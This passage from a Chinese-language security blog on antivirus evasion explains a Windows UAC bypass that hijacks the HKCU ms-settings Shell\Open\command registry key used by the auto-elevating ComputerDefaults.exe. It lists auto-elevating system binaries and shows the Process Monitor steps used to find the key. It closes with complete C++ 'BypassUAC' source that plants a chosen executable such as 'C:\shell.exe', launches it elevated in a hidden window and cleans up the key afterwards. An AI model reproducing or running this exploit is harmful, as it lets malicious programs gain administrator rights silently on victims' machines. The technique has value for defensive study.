class="line">c:\windows\system32\msconfig.exe</span><br><span class="line">c:\windows\system32\msra.exe</span><br><span class="line">c:\windows\system32\MultiDigiMon.exe</span><br><span class="line">c:\windows\system32\newdev.exe</span><br><span class="line">c:\windows\system32\odbcad32.exe</span><br><span class="line">c:\windows\system32\PasswordOnWakeSettingFlyout.exe</span><br><span class="line">c:\windows\system32\recdisc.exe</span><br><span class="line">c:\windows\system32\rrinstaller.exe</span><br><span class="line">c:\windows\system32\shrpubw.exe</span><br><span class="line">c:\windows\system32\slui.exe</span><br><span class="line">c:\windows\system32\Sysprep\sysprep.exe</span><br><span class="line">c:\windows\system32\SystemPropertiesAdvanced.exe</span><br><span class="line">c:\windows\system32\SystemPropertiesComputerName.exe</span><br><span class="line">c:\windows\system32\SystemPropertiesDataExecutionPrevention.exe</span><br><span class="line">c:\windows\system32\SystemPropertiesHardware.exe</span><br><span class="line">c:\windows\system32\SystemPropertiesPerformance.exe</span><br><span class="line">c:\windows\system32\SystemPropertiesProtection.exe</span><br><span class="line">c:\windows\system32\SystemPropertiesRemote.exe</span><br><span class="line">c:\windows\system32\SystemSettingsAdminFlows.exe</span><br><span class="line">c:\windows\system32\SystemSettingsRemoveDevice.exe</span><br><span class="line">c:\windows\system32\Taskmgr.exe</span><br><span class="line">c:\windows\system32\tcmsetup.exe</span><br><span class="line">c:\windows\system32\TpmInit.exe</span><br><span class="line">c:\windows\system32\WindowsUpdateElevatedInstaller.exe</span><br><span class="line">c:\windows\system32\WSReset.exe</span><br><span class="line">c:\windows\system32\wusa.exe</span><br></pre></td></tr></table></figure>

<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p>这里我们还是以ComputerDefaults.exe为例，我们使用Process Monitor去监视程序启动的事件，在启动的一瞬间我们可以看见出现了很多事件</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241002190357063.png" alt="image-20241002190357063"></p>
<p>设置过滤条件，这里我们需要寻找的是RegOpenKey，因为它可以打开注册表项，继承我们软件的权限</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">LSTATUS <span class="title function_">RegOpenKeyA</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]           HKEY   hKey,</span></span><br><span class="line"><span class="params">  [in, optional] LPCSTR lpSubKey,</span></span><br><span class="line"><span class="params">  [out]          PHKEY  phkResult</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<p>这里也就对应了我们上面要求的第三点，<strong>3. 从注册表里查询Shell\Open\command键值对</strong>，因为这样一个打开注册表的操作，能帮我们起一个带权限的cmd，向下继续搜索</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241002191236923.png" alt="image-20241002191236923"></p>
<p>这里有一个小tips，我们寻找键值还有一个注意点，最好寻找Result处为Name No Found的键值，因为如果我们找到了一个Success的键值，证明这是被程序正常访问的，那么我们对其进行修改就很有可能会影响到程序正常启动</p>
<p>我们可以看程序查找dll的完整路径HKCU\Software\Classes\ms-settings\Shell\Open\command</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241002210139121.png" alt="image-20241002210139121"></p>
<p>除了HKCU其他几个键值表修改要管理员权限</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241002205338279.png" alt="image-20241002205338279"></p>
<p>我们按照路径找，但是在路径里面只能找到classes这一级</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241002205633181.png" alt="image-20241002205633181"></p>
<p>所以我们新建剩下的表项</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241002210212850.png" alt="image-20241002210212850"></p>
<p>不过我做这个复现的时候，貌似已经修了</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241002224655693.png" alt="image-20241002224655693"></p>
<p>为什么知道修了呢，我们所需的DelegateExecute在我的win版本中</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241003164954753.png" alt="image-20241003164954753"></p>
<p>以及我的虚拟机版本中</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241003165349834.png" alt="image-20241003165349834"></p>
<p>相关注册表的值已经由HKCU改为了HKCR，这意味着我们在执行RegQueryValue时需要使用更高的权限，这就失去了UAC注册表劫持来提权的意义</p>
<p>![2b720574465180445fd8468c34bf2c4](C:\Users\su\Documents\WeChat Files\wxid_pfbd0i5dynxu22\FileStorage\Temp\2b720574465180445fd8468c34bf2c4.png)</p>
<p>但是思路还是有参考价值的</p>
<p><strong>找到能够指向文件路径并打开的键值，然后修改它的值指向我们的恶意程序</strong></p>
<p>这里还是给出一个老demo作为结束</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// UACcpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;tchar.h&quot;</span></span></span><br><span class="line">DWORD <span class="title function_">BypassUAC</span><span class="params">(LPWSTR filePath)</span></span><br><span class="line">&#123;</span><br><span class="line">PROCESS_INFORMATION pi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">STARTUPINFOA si = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">HKEY hKey;</span><br><span class="line">si.cb = <span class="keyword">sizeof</span>(STARTUPINFO);</span><br><span class="line">si.wShowWindow = SW_HIDE;</span><br><span class="line">DWORD dwDisposition;</span><br><span class="line"><span class="keyword">if</span> (filePath == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] FilePath is null, please try again!\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Get filePath success , the filePath is : %ws\n&quot;</span>, filePath);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (ERROR_SUCCESS != ::RegCreateKeyW(HKEY_CURRENT_USER,</span><br><span class="line"><span class="string">L&quot;Software\\Classes\\ms-settings\\Shell\\open\\command&quot;</span>, &amp;hKey))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] Create regedit failed, error is : %d\n&quot;</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Create regedit successfully!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (ERROR_SUCCESS != ::RegSetValueExW(hKey, <span class="literal">NULL</span>, <span class="number">0</span>, REG_SZ,</span><br><span class="line">(BYTE*)filePath, (::lstrlenW(filePath) + <span class="number">1024</span>)))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] Create exe_key-value failed, error is : %d\n&quot;</span>,</span><br><span class="line">GetLastError());</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Create exe_key-value successfully!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (ERROR_SUCCESS != RegSetValueExW(hKey, <span class="string">L&quot;DelegateExecute&quot;</span>, <span class="number">0</span>, REG_SZ,</span><br><span class="line">(BYTE*)<span class="string">&quot;&quot;</span>, <span class="keyword">sizeof</span>(<span class="string">&quot;&quot;</span>)))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] Create delete_key-value failed, error is : %d\n&quot;</span>,</span><br><span class="line">GetLastError());</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Create delete_key-value successfully!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == CreateProcessA(<span class="string">&quot;C:\\Windows\\System32\\cmd.exe&quot;</span>, (LPSTR)<span class="string">&quot;/c</span></span><br><span class="line"><span class="string">C:\\Windows\\System32\\ComputerDefaults.exe&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE,</span><br><span class="line">NORMAL_PRIORITY_CLASS, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] Create Process failed, error is : %d\n&quot;</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Create Process successfully!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">Sleep(<span class="number">3000</span>);</span><br><span class="line"><span class="keyword">if</span> (ERROR_SUCCESS != ::RegDeleteTreeW(HKEY_CURRENT_USER,</span><br><span class="line"><span class="string">L&quot;Software\\Classes\\ms-settings&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] Delete regedit failed, error is : %d\n&quot;</span>, GetLastError());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Delete regedit successfully!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">wmain</span><span class="params">(<span class="type">int</span> argc, <span class="type">wchar_t</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (argc != <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;UAC.exe &lt;filepath&gt;&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;UAC.exe C:\\shell.exe&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">LPWSTR filePath = argv[<span class="number">1</span>];</span><br><span class="line">BypassUAC(filePath);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/10/08/%E5%85%8D%E6%9D%80/UAC/" data-id="cm1zwlrfn000bu0v6c3jbhxlt" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/10/">October 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/09/">September 2024</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2024/10/08/%E5%85%8D%E6%9D%80/%E9%9A%90%E8%97%8F%E5%AF%BC%E5%85%A5%E8%A1%A8/">(no title)</a>
          </li>
        
          <li>
            <a href="/2024/10/08/%E5%85%8D%E6%9D%80/%E8%BF%9B%E7%A8%8B%E5%BC%BA%E6%9D%80/">(no title)</a>
          </li>
        
          <li>
            <a href="/2024/10/08/%E5%85%8D%E6%9D%80/%E8%BF%9B%E7%A8%8B%E5%92%8C%E7%BA%BF%E7%A8%8B/">(no title)</a>
          </li>
        
          <li>
            <a href="/2024/10/08/%E5%85%8D%E6%9D%80/%E8%B0%83%E8%AF%95/">(no title)</a>
          </li>
        
          <li>
            <a href="/2024/10/08/%E5%85%8D%E6%9D%80/%E7%86%B5%E4%B8%8E%E8%87%AA%E7%AD%BE%E5%90%8D/">(no title)</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2024 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>